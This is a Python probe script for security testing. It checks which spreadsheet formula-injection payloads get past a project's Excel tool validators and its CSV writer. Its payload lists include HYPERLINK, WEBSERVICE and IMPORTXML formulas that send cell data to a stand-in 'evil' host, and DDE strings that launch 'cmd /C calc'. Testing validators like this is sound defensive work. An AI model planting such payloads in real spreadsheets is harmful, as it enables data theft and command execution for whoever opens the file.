"""Probe: quantify the spreadsheet formula-injection bypass surface.

Read-only w.r.t. the repository. Copies each tool module to a temp dir with the
langchain / sibling imports stripped, imports them as real modules, and checks
which payloads survive the real pydantic validators.
"""
from __future__ import annotations

import csv as _csv
import importlib.util
import io
import re
import shutil
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parents[3]
TOOLS = REPO / "src" / "backend" / "tools"

cell_values = [
    "=HYPERLINK(\"http://evil/?x=\"&A1,\"open\")",
    "+SUM(1,1)",
    "-SUM(1,1)",
    "@SUM(1,1)",
    "\t=SUM(1,1)",
    "\n=SUM(1,1)",
    "\r=SUM(1,1)",
    "  =SUM(1,1)",
    " =SUM(1,1)",
    " =SUM(1,1)",
    "|cmd| /C calc",
    "cmd| /C calc",
]
formulas = [
    "=cmd|'/c calc'!A1",
    "=WEBSERVICE(\"http://evil/x\")",
    "=WEBAPI(\"http://evil/x\")",
    "=IMPORTXML(\"http://evil/x\",\"//x\")",
    "=FILTERXML(\"http://evil/x\",\"//x\")",
    "=DDE(\"srv\",\"topic\",\"cmd\")",
    "=HYPERLINK(\"http://evil/?x=\"&A1,\"open\")",
    "\t=SUM(1,1)",
    "=SUM(1,1)",
]


def import_tool(filename: str, name: str):
    tmp = Path(tempfile.mkdtemp(prefix="probe-"))
    try:
        src = (TOOLS / filename).read_text(encoding="utf-8")
        kept = [
            line
            for line in src.splitlines(keepends=True)
            if "langchain_core" not in line and "from ._files" not in line
        ]
        (tmp / "_files.py").write_text(
            "class FileAccessError(Exception): pass\n"
            "def resolve_safe_path(*a, **k): raise NotImplementedError\n",
            encoding="utf-8",
        )
        (tmp / (name + ".py")).write_text("".join(kept), encoding="utf-8")
        sys.path.insert(0, str(tmp))
        spec = importlib.util.spec_from_file_location(name, tmp / (name + ".py"))
        mod = importlib.util.module_from_spec(spec)
        sys.modules[name] = mod
        spec.loader.exec_module(mod)
        return mod
    finally:
        sys.path.remove(str(tmp))
        shutil.rmtree(tmp, ignore_errors=True)


def report(title: str, pairs):
    print(f"=== {title} ===")
    for label, fn in pairs:
        try:
            fn()
            print(f"  ALLOWED  {label}")
        except Exception as exc:  # noqa: BLE001
            print(f"  BLOCKED  {label}   [{str(exc).splitlines()[0][:90]}]")


ee = import_tool("excel_edit.py", "probe_ee")
ec = import_tool("excel_create.py", "probe_ec")

report(
    "excel_edit.set_cell value",
    [
        (repr(v), lambda v=v: ee.ExcelEditOperation(action="set_cell", cell="A1", value=v))
        for v in cell_values
    ],
)
report(
    "excel_edit.set_formula formula",
    [
        (repr(f), lambda f=f: ee.ExcelEditOperation(action="set_formula", cell="A1", formula=f))
        for f in formulas
    ],
)
report(
    "excel_edit.set_number_format (DDE | unchecked)",
    [
        (
            repr(f),
            lambda f=f: ee.ExcelEditOperation(
                action="set_number_format", column_index=1, number_format=f
            ),
        )
        for f in ["#,##0.00", "|cmd| /C calc", "=HYPERLINK(\"http://e/\")"]
    ],
)
report(
    "excel_create.formulas[].formula",
    [(repr(f), lambda f=f: ec.SpreadsheetFormula(cell="A1", formula=f)) for f in formulas],
)
report(
    "excel_create.rows[] cell values",
    [(repr(v), lambda v=v: ec.SpreadsheetSheet(name="S", rows=[[v, "x"]])) for v in cell_values],
)

print("=== csv writer round-trip (no guard) ===")
for v in cell_values:
    buf = io.StringIO(newline="")
    _csv.writer(buf).writerow(["hdr", v])
    print(f"  {v!r:46} -> {buf.getvalue().strip()!r}")

print("=== _CONTROL_CHARS skip set ===")
ctl = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f]")
for ch in ["\t", "\n", "\r"]:
    print(f"  {ch!r} matches _CONTROL_CHARS? {bool(ctl.search(ch))}")
